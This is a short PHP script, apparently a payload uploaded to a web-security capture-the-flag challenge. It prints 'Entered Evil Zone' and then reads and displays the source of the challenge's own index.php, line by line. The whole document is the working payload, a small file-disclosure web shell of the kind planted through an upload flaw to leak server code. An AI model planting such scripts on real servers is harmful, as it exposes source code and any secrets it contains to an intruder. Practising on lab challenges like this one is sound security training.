<?php
echo("Entered Evil Zone"."<br>");
$myfile = fopen("/challenge/web-serveur/ch13/index.php", "r") or die("Unable to open file!");
while(!feof($myfile)) {
  echo fgets($myfile) . "<br>";
}
fclose($myfile);
?>
